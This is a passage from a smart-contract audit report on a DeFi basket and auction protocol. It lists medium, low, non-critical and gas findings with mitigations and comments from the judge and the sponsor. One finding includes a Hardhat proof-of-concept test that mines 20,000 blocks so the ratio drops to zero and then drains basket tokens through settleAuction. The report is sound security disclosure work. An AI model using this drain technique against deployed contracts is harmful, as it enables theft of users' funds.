without the function reverting.\n\nFor that, we manipulate `newRatio` to be 0 then the whole thing will be 0.\n`newRatio` is defined as:\n\n```solidity\n  uint256 a = factory.auctionMultiplier() * basket.ibRatio();\n  uint256 b = (bondBlock - auctionStart) * BASE / factory.auctionDecrement();\n  uint256 newRatio = a - b;\n```\n\nThere's 1 value the attacker controls, `bondBlock`. That value is the block in which the `bondForRebalance()` function was triggered.\nSo the goal is to get `newRatio` to be 0. With the base settings of the contract:\n\n*   auctionMultiplier == 2\n*   ibRatio == 1e18\n*   BASE == 1e18\n*   auctionDecrement == 10000\n\n`bondBlock` has to be `auctionStart + 20000`. Meaning, the `bondForRebalance()` function has to be triggered exactly 20000 blocks after the action was started. That would be around 3 1/2 days after auction start.\n\nAt that point, `newRatio` is 0, and thus `tokensNeeded` is 0. The only thing left to do is to call `settleAuction()` and pass the basket's tokens and balance as the output tokens and weight.\n\n### Proof of Concept\n\nHere's a test implementing the above scenario as a test. You can add it to `Auction.test.js`.:\n\n```js\n      it.only(\"should allow me to steal funds\", async() => {\n        // start an auction\n        let NEW_UNI_WEIGHT = \"2400000000000000000\";\n        let NEW_COMP_WEIGHT = \"2000000000000000000\";\n        let NEW_AAVE_WEIGHT = \"400000000000000000\";\n\n        await expect(basket.publishNewIndex([UNI.address, COMP.address, AAVE.address], \n            [NEW_UNI_WEIGHT, NEW_COMP_WEIGHT, NEW_AAVE_WEIGHT], 1)).to.be.ok;\n        await increaseTime(60 * 60 * 24)\n        await increaseTime(60 * 60 * 24)\n        await expect(basket.publishNewIndex([UNI.address, COMP.address, AAVE.address], \n          [NEW_UNI_WEIGHT, NEW_COMP_WEIGHT, NEW_AAVE_WEIGHT], 1)).to.be.ok;\n\n        let auctionAddr = await basket.auction();\n        let auction = AuctionImpl.attach(auctionAddr);\n\n        ethers.provider.getBlockNumber();\n        // increase the block number for `bondBlock - auctionStart` to be 20000.\n        // When that's the case, the result of `newRatio` in `settleAuction()` \n        // is `0`. And that means `tokensNeeded` is 0. Which means,\n        // we can take out all the tokens we want using the `outputTokens` array\n        // without having to worry about basket's balance at the end.\n        // The math changes depending on the settings of the factory contract or the\n        // Basket contract. But, the gist is that you try to get newRatio to be 0.\n        // The only values you can control as a attacker is the bondBlock after the auction\n        // was started.\n        for (let i = 0; i < 20000; i++) {\n          await hre.network.provider.send(\"evm_mine\")\n        }\n        await basket.approve(auction.address, '5000000000000000');\n        await expect(auction.bondForRebalance()).to.be.ok;\n        await expect(auction.settleAuction([], [], [], [UNI.address, AAVE.address], [\"200720000000000000\", \"200120000000000000\"])).to.be.ok;\n      });\n```\n\nAgain, this test uses the base values. The math changes when the settings change. But, it should always be possible to trigger this attack. The gap between auction start and bonding just changes.\n\n### Recommended Mitigation Steps\n\n*   Verify that `newRatio != 0`\n\n**[frank-beard (Kuiper) confirmed and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/74#issuecomment-1048137500):**\n > This is the reasoning for the minIbRatio value that the publisher sets when rebalancing weights. However we do need a check to make sure that `minIbRatio` is above 0.\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/74#issuecomment-1079813752):**\n > I don't think this deserves a `high` severity rating. There are a number of assumptions made:\n>  - `minIbRatio` has not been set to an expected value.\n>  - The bonded user must be able to wait a certain number of blocks, likely exceeding the maximum amount of time allowed to settle the auction. This is currently set to one day. However, I understand that there might be some time that passes before a user bonds tokens and when the auction started.\n> \n> Because this issue is not directly exploitable, I think this behaviour fits the criteria of a `medium` severity issue.\n\n\n\n***\n\n## [[M-07] `Auction.sol#settleAuction()` Bonder may not be able to settle a bonded auction, leading to loss of funds](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/106)\n_Submitted by WatchPug_\n\n[Auction.sol#L97-L102](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Auction.sol#L97-L102)\n\n```solidity\n    uint256 a = factory.auctionMultiplier() * basket.ibRatio();\n    uint256 b = (bondBlock - auctionStart) * BASE / factory.auctionDecrement();\n    uint256 newRatio = a - b;\n\n    (address[] memory pendingTokens, uint256[] memory pendingWeights, uint256 minIbRatio) = basket.getPendingWeights();\n    require(newRatio >= minIbRatio);\n```\n\nIn the current implementation, `newRatio` is calculated and compared with `minIbRatio` in `settleAuction()`.\n\nHowever, if `newRatio` is less than `minIbRatio`, `settleAuction()` will always fail and there is no way for the bonder to cancel and get a refund.\n\n### Proof of Concept\n\nGiven:\n\n*   `bondPercentDiv` = 400\n*   `basketToken.totalSupply` = 40,000\n*   `factory.auctionMultiplier` = 2\n*   `factory.auctionDecrement` = 10,000\n*   `basket.ibRatio` = 1e18\n*   p`endingWeights.minIbRatio` = 1.9 \\* 1e18\n\n1.  Alice called `bondForRebalance()` `2,000` blocks after the auction started, paid `100` basketToken for the bond;\n2.  Alice tries to `settleAuction()`, it will always fail because `newRatio < minIbRatio`;\n\n*   a = 2 \\* 1e18\n*   b = 0.2 \\* 1e18\n*   newRatio = 1.8 \\* 1e18;\n\n3.  Bob calls `bondBurn()` one day after, `100` basketToken from Alice will been burned.\n\n### Recommended Mitigation Steps\n\nMove the `minIbRatio` check to `bondForRebalance()`:\n\n```solidity\nfunction bondForRebalance() public override {\n    require(auctionOngoing);\n    require(!hasBonded);\n\n    bondTimestamp = block.timestamp;\n    bondBlock = block.number;\n\n    uint256 a = factory.auctionMultiplier() * basket.ibRatio();\n    uint256 b = (bondBlock - auctionStart) * BASE / factory.auctionDecrement();\n    uint256 newRatio = a - b;\n\n    (address[] memory pendingTokens, uint256[] memory pendingWeights, uint256 minIbRatio) = basket.getPendingWeights();\n    require(newRatio >= minIbRatio);\n\n    IERC20 basketToken = IERC20(address(basket));\n    bondAmount = basketToken.totalSupply() / factory.bondPercentDiv();\n    basketToken.safeTransferFrom(msg.sender, address(this), bondAmount);\n    hasBonded = true;\n    auctionBonder = msg.sender;\n\n    emit Bonded(msg.sender, bondAmount);\n}\n```\n\n**[frank-beard (Kuiper) confirmed](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/106)**\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/106#issuecomment-1079817328):**\n > While this issue is correct and I think this is a safer way to handle the `require(newRatio >= minIbRatio)` check, there are a few assumptions that are made. For example, it is assumed that the user bonds their tokens without checking `minIbRatio` and a publisher is able to maliciously update `minIbRatio` which must first go through timelock. Based on this, I'm more inclined to downgrade this to `medium` severity as I think this more accurately reflects the threat model.\n\n\n\n***\n\n## [[M-08] Lost fees due to precision loss in fees calculation](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/60)\n_Submitted by kenzo, also found by 0v3rf10w_\n\nIn fees calculation, division is being used in the midst of the calculation, not at the end of it.\nThis leads to lost precision in fee amount (as solidity doesn't save remainder of division).\nDivision should happen at the end to maintain precision.\n\n### Impact\n\nLost fees.\nThe exact amount depends on the parameters set and being tested.\nAccording to a few tests I ran, it seems that in normal usage, 1% of fees are lost.\nIn some cases even 7.5% of fees.\n\n### Proof of Concept\n\nDivision in the midst of a calculation:\n```solidity\nuint256 feePct = timeDiff * licenseFee / ONE_YEAR;\nuint256 fee = startSupply * feePct / (BASE - feePct);\n\n_mint(publisher, fee * (BASE - factory.ownerSplit()) / BASE);\n_mint(Ownable(address(factory)).owner(), fee * factory.ownerSplit() / BASE);\n```\n\n[Basket.sol#L140:#L145](https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L140:#L145)<br>\nIt's a little hard to share a POC script as it involves changing the .sol file so I tested it manually. But after moving the division to the end using the mitigation below, I saw 1%-7% increases in fees minted. Usually 1%.\n\n### Recommended Mitigation Steps\n\nWe want to firstly do all multiplication and lastly do all the division.\nSo remove the usage of feePct and instead set fee to be:\n```solidity\nuint256 fee = startSupply * licenseFee * timeDiff / ONE_YEAR / (BASE - licenseFee);\n```\n\n**[frank-beard (Kuiper) confirmed](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/60)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/60#issuecomment-1079826919):**\n > Nice find! I think this qualifies as `medium` risk due to the protocol regularly leaking value. This can be mitigated by performing division at the very end of the fee calculation.\n\n\n\n***\n\n## [[M-09] `Basket:handleFees` fee calculation is wrong](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/43)\n_Submitted by GiveMeTestEther_\n\nThe fee calculation on L141 is wrong. It should only get divided by BASE and not (BASE - feePct)\n\n### Proof of Concept\n\nThis shows dividing only by BASE is correct:<br>\nAssumptions:\n\n*   BASE is 1e18 accordign to the code\n*   timeDiff is exactly ONE_YEAR (for easier calculations)\n*   startSupply is 1e18 (exactly one basket token, also represents 100% in fee terms)\n*   licenseFee is 1e15 (0.1%)\n\nIf we calculate the fee of one whole year and startSupply is one token (1e18, equal to 100%), the fee should be exactly the licenseFee  (1e15, 0.1%),\n\nuint256 timeDiff = ONE_YEAR;<br>\nuint256 feePct = timeDiff \\* licenseFee / ONE_YEAR;<br>\n\\=> therefore we have: feePct = licenseFee which is 1e15 (0.1%) according to our assumptions<br>\nuint256 fee = startSupply \\* feePct / BASE; // only divide by BASE<br>\n\\=> insert values => fee = 1e18 \\* licenseFee  / 1e18 = licenseFee\n\nThis shows the math is wrong:\n\nAssumptions:\n\n*   BASE is 1e18 according to the code\n*   timeDiff is exactly ONE_YEAR (for easier calculations)\n*   startSupply is 1e18 (exactly one basket token, also represents 100% in fee terms)\n*   licenseFee is 1e15 (0.1%)\n\nIf we calculate the fee of one whole year and startSupply is one token (1e18, equal to 100%), the fee should be exactly the licenseFee  (1e15, 0.1%), but the fee is bigger than that.\n\nuint256 timeDiff = ONE_YEAR;<br>\nuint256 feePct = timeDiff \\* licenseFee / ONE_YEAR;<br>\n\\=> therefore we have: feePct = licenseFee which is 1e15 (0.1%) according to our assumptions\n\nuint256 fee = startSupply \\* feePct / (BASE - feePct);<br>\ninsert the values => fee = 1e18 \\* 1e15 / (1e18 - 1e15) => (factor out 1e15) => fee = 1e15 \\* 1e18 / (1e15 \\* ( 1e3 - 1) => (cancel 1e15) => 1e18 / ( 1e3 - 1)\n\nmath: if we increase the divisor but the dividend stays the same we get a smaller number e.g. (1 / (2-1)) is bigger than (1 / 2)<br>\napply this here => 1e18 / ( 1e3 - 1) > 1e18 / 1e3 => 1e18 / ( 1e3 - 1) > 1e15  this shows that the fee is higher than 1e15\n\n[Basket.sol#L133](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L133)<br>\n[Basket.sol#L141](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L141)\n\n### Recommended Mitigation Steps\n\nOnly divide by BASE.\n\n**[frank-beard (Kuiper) confirmed](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/43)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/43#issuecomment-1079828004):**\n > I think this is valid. Calculating fees as `startSupply * feePct / (BASE - feePct)` leads to an overestimation of fees charged on users.\n\n\n\n***\n\n## [[M-10] Fee calculation is slightly off](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/152)\n_Submitted by gzeon_\n\nThe fee calculation\n```solidity\nuint256 timeDiff = (block.timestamp - lastFee);\nuint256 feePct = timeDiff * licenseFee / ONE_YEAR;\nuint256 fee = startSupply * feePct / (BASE - feePct);\n```\ntries to calculate a fee such that fee/(supply+fee) = %fee using a simple interest formula (i.e. no compounding), this lead to slightly less fee collected when fee are collected more frequently (small timeDiff) vs less frequently (big timeDiff).\n\n### Proof of Concept\n\n[Basket.sol#L133](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L133)\n\n**[frank-beard (Kuiper) acknowledged, but disagreed with Medium severity and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/152#issuecomment-1048146206):**\n > While this is technically true, the actual precision loss should be very negligible.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/152#issuecomment-1079829640):**\n > I think any precision loss or value leakage qualifies for a `medium` severity issue. This seems like it would lead to an inconsistent fee calculation and is probably worthwhile fixing long-term.\n\n\n\n***\n\n## [[M-11] `Basket:handleFees():` fees are overcharged](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/170)\n_Submitted by GiveMeTestEther_\n\nThe fee calculation is based on the totalSupply of the basket token. But some amount of the totalSupply represents the fees paid to the publisher/ protocol owner. Therefore the fees are \"overcharged\":  because the fee amount is calculated on a part of already \"paid\" fees, should only take into account what is \"owned\"\nby the users and not the publisher/protocol owner.\n\n### Proof of Concept\n\nL141: the fee percent is multiplied by startSupply (=basket token total supply)<br>\nL144 & L145: publisher / protocol owner receive basket tokens as fees payment<br>\n[Basket.sol#L141](https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L141)\n\n### Recommended Mitigation Steps\n\n*   account the fee amount in a storage variable: uint256 feeAmount;\n*   subtract feeAmount from startSupply L141: uint256 fee = (startSupply - feeAmount) \\* feePct / (BASE - feePct); // note the other bug about only dividing by BASE\n*   add the fee to feeAmount after the calculation:  feeAmount += fee;\n*   if publisher/protocol owner burn basket token, reduce the feeAmount etc.\n\n**[frank-beard (Kuiper) acknowledged and commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/170#issuecomment-1049062352):**\n > Generally we think that the amount of overcharged fees from this matter will be very negligible in the long term. It is worth noting that the fix proposed would not really solve the problem as not all tokens owned by the publisher/owner may be fees as well as they could just transfer those fees to another account and burn from there.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/170#issuecomment-1079820186):**\n > I'm not sure if this is correct. `startSupply` is indeed equal to `totalSupply()` but it is queried before new tokens are minted to the factory owner and publisher. As such, the fees appear to be correctly charged. I'll have @frank-beard confirm this as I may have missed something.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/170#issuecomment-1087492580):**\n > Considering @frank-beard has not replied to this, I'm gonna make the final judgement and keep this open. I think it makes sense to track the fees paid out to the factory owner and publisher and have this amount excluded from the fee calculations. Upon either party burning tokens, this fee amount tracker must be updated accordingly. Due to the added complexity, it is understandable that this issue would be deemed a wontfix by the sponsor.\n\n**[frank-beard (Kuiper) commented](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/170#issuecomment-1087614572):**\n > Yeah so I do agree that it does make sense generally to track the fees paid out and exclude, however in this case the impact is very low and yeah the complexity to deal with it doesn't seem worth it.\n\n\n\n***\n\n# Low Risk Findings (8)\n- [[L-01] Extra payments for an auction gets stucks](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/137) _Submitted by 0x0x0x_\n- [[L-02] `maxSupply` can be exceeded](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/146) _Submitted by 0x0x0x_\n- [[L-03] Bonding doesn't seem to perform any meaningful role and leads to inefficient auctions](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/56) _Submitted by TomFrenchBlockchain_\n- [[L-04] Factory can block auctions](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/150) _Submitted by 0x0x0x_\n- [[L-05] `Basket.sol` Pending licenseFee may unable to be canceled when current licenseFee is `0`](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/103) _Submitted by WatchPug_\n- [[L-06] `Basket.sol` should use the Upgradeable variant of OpenZeppelin Contracts](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/104) _Submitted by WatchPug_\n- [[L-07] `Basket.sol#changeLicenseFee()` Unable to set `licenseFee` to 0](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/97) _Submitted by WatchPug_\n- [[L-08] changeLicenseFee() and fees for previous period](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/33) _Submitted by gpersoon_\n\n# Non-Critical Findings (29)\n- [[N-01] TODO comments should be resolved ](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/135) _Submitted by Jujic, also found by hagrid, Meta0xNull, and robee_\n- [[N-02] `Ownable` Contract Does Not Implement Two-Step Transfer Ownership Pattern](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/30) _Submitted by hagrid_\n- [[N-03] Missing Revert Messages](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/31) _Submitted by hagrid, also found by robee_\n- [[N-04] Use of deprecated `safeApprove()` function](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/177) _Submitted by broccolirob, also found by GiveMeTestEther, gzeon, Meta0xNull, robee, and sirhashalot_\n- [[N-05] Not verified function inputs of public / external functions](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/27) _Submitted by robee_\n- [[N-06] Incorrent visibility for \"initialized\" variable](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/50) _Submitted by neslinesli93_\n- [[N-07] `BasketLicenseProposed` better emit proposal id](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/134) _Submitted by gzeon_\n- [[N-08] setAuctionDecrement() Lack of Input Validation May Break Other Function](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/83) _Submitted by Meta0xNull, also found by gpersoon_\n- [[N-09] setAuctionMultiplier() Lack of Input Validation May Break Other Function](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/82) _Submitted by Meta0xNull, also found by gpersoon_\n- [[N-10] Broken unit tests due to incorrect values](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/88) _Submitted by bw_\n- [[N-11] `NewIndexSubmitted` event is not emitted in some case](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/115) _Submitted by WatchPug_\n- [[N-12] Factory:setOwnerSplit owner fee split can be set to exactly 20%](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/44) _Submitted by GiveMeTestEther_\n- [[N-13] Emit for publishNewIndex / killAuction part](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/32) _Submitted by gpersoon_\n- [[N-14] Use of Require statement without reason message](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/10) _Submitted by 0x1f8b_\n- [[N-15] Remove override keyword from Auction](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/12) _Submitted by 0x1f8b_\n- [[N-16] Remove override keyword from Basket](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/13) _Submitted by 0x1f8b_\n- [[N-17] Lack of event indexing](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/15) _Submitted by 0x1f8b_\n- [[N-18] Lack of input verification](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/8) _Submitted by 0x1f8b_\n- [[N-19] Remove override keyword](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/9) _Submitted by 0x1f8b_\n- [[N-20] Lack of message in require statments](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/6) _Submitted by BouSalman_\n- [[N-21] Lack of revert reason strings](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/5) _Submitted by TomFrenchBlockchain_\n- [[N-22] `Factory.sol` Lack of two-step procedure and/or input validation routines for critical operations leaves them error-prone](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/111) _Submitted by WatchPug_\n- [[N-23] Critical operations should emit events](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/112) _Submitted by WatchPug_\n- [[N-24] Outdated compiler version](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/90) _Submitted by WatchPug_\n- [[N-25] Missing error messages in require statements](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/93) _Submitted by WatchPug_\n- [[N-26] Wrong syntax in test leads to wrong test results](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/62) _Submitted by kenzo_\n- [[N-27] Unnecessary variable initialization and TODO in code](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/76) _Submitted by neslinesli93_\n- [[N-28] Possible division by zero in `settleAuction`](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/77) _Submitted by neslinesli93_\n- [[N-29] Open TODOs](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/157) _Submitted by ye0lde_\n\n# Gas Optimizations (40)\n- [[G-01] Check for tokenAmount > 0 is missing in pushUnderlying function [basket.sol]](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/165) _Submitted by rishabh_\n- [[G-02] For uint `> 0` can be replaced with ` != 0` for gas optimization](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/139) _Submitted by 0x0x0x, also found by Jujic, pmerkleplant, and ye0lde_\n- [[G-03] Loops can be implemented more efficiently](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/140) _Submitted by 0x0x0x, also found by Jujic, Meta0xNull, pmerkleplant, rishabh, and WatchPug_\n- [[G-04] Use negate(!) rather than `== false`](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/138) _Submitted by 0x0x0x, also found by ye0lde_\n- [[G-05] `++i` is more efficient than `i++`](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/120) _Submitted by WatchPug, also found by Jujic and pedroais_\n- [[G-06] `mintTo` has not an extra require statement](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/142) _Submitted by 0x0x0x, also found by danb and TomFrenchBlockchain_\n- [[G-07] `Basket.sol#handleFees()` Check if `timeDiff > 0` can save gas](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/110) _Submitted by WatchPug, also found by 0x0x0x_\n- [[G-08] Division with `BASE` twice can be optimized ](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/147) _Submitted by 0x0x0x_\n- [[G-09] Auction:settleAuction() cache address(basket)](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/164) _Submitted by GiveMeTestEther_\n- [[G-10] Auction:bondForRebalance() store calculation of bondAmount in local variable](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/166) _Submitted by GiveMeTestEther_\n- [[G-11] Auction:bondBurn(): cache bondAmount](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/167) _Submitted by GiveMeTestEther_\n- [[G-12] Cache external call results can save gas](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/122) _Submitted by WatchPug, also found by TomFrenchBlockchain_\n- [[G-13] Factory:constructor don't need to zero initialize storage variable](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/45) _Submitted by GiveMeTestEther, also found by gzeon, Jujic, kenzo, sirhashalot, TomFrenchBlockchain, WatchPug, and ye0lde_\n- [[G-14] Basket:initialize() reuse function argument instead of storage variable](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/46) _Submitted by GiveMeTestEther_\n- [[G-15] Basket:handleFees() use unchecked to save gas](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/47) _Submitted by GiveMeTestEther_\n- [[G-16] Function handleFees #L148-L151 and updateIBRatio (Basket.sol) can be refactored for efficiency and clarity](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/161) _Submitted by ye0lde, also found by GiveMeTestEther, kenzo, and WatchPug_\n- [[G-17] Basket:pushUnderlying()/pullUnderlying() cache ibRatio to save gas](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/49) _Submitted by GiveMeTestEther, also found by WatchPug_\n- [[G-18] `validateWeights()` Limit loop to a meaningful bound can save gas](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/118) _Submitted by WatchPug, also found by danb, GiveMeTestEther, kenzo, and TomFrenchBlockchain_\n- [[G-19] Useless imports](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/113) _Submitted by Jujic_\n- [[G-20] Avoid Initialization of Loop Index If It Is 0 to Save Gas](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/84) _Submitted by Meta0xNull_\n- [[G-21] Extra ERC20 approvals/transfers on Basket deployment](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/2) _Submitted by TomFrenchBlockchain_\n- [[G-22] Auction.auctionOngoing variable is unnecessary](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/36) _Submitted by TomFrenchBlockchain_\n- [[G-23] Auction.hasBonded variable is unnecessary](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/37) _Submitted by TomFrenchBlockchain_\n- [[G-24] Excessive checking of basket totalsupply](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/38) _Submitted by TomFrenchBlockchain, also found by kenzo_\n- [[G-25] Minted and Burned events are unnecessary](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/4) _Submitted by TomFrenchBlockchain_\n- [[G-26] Publisher switch logic can be simplified](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/41) _Submitted by TomFrenchBlockchain, also found by WatchPug_\n- [[G-27] Gas Optimization: Reorder storage layout](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/129) _Submitted by gzeon, also found by saian_\n- [[G-28] `auctionImpl` and `basketImpl` in factory can be made immutable for gas savings](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/57) _Submitted by TomFrenchBlockchain, also found by bw, gzeon, and robee_\n- [[G-29] `Basket.sol#approveUnderlying()` Cache and read storage variables from the stack can save gas](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/100) _Submitted by WatchPug_\n- [[G-30] `Auction.sol#auctionOngoing` Switching between 1, 2 instead of true, false is more gas efficient](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/107) _Submitted by WatchPug_\n- [[G-31] Use free functions to replace external calls can save gas](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/117) _Submitted by WatchPug_\n- [[G-32] Unnecessary checked arithmetic in for loops](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/121) _Submitted by WatchPug_\n- [[G-33] Adding unchecked directive can save gas](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/123) _Submitted by WatchPug_\n- [[G-34] `Auction.sol#initialize()` Use msg.sender rather than factory_ parameter can save gas](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/126) _Submitted by WatchPug_\n- [[G-35] `Basket.sol#initialize()` Remove redundant assertion can save gas](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/92) _Submitted by WatchPug_\n- [[G-36] Gas: Redundant check in `setNewMaxSupply`](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/7) _Submitted by cmichel_\n- [[G-37] Unused imports](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/91) _Submitted by WatchPug, also found by robee_\n- [[G-38] Gas Optimization: Use calldata instead of memory](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/130) _Submitted by gzeon_\n- [[G-39] Function changePublisher, changeLicenseFee, and setNewMaxSupply  can be refactored for efficiency and clarity](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/162) _Submitted by ye0lde, also found by neslinesli93_\n- [[G-40] Storage double reading. Could save SLOAD](https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/18) _Submitted by robee_\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}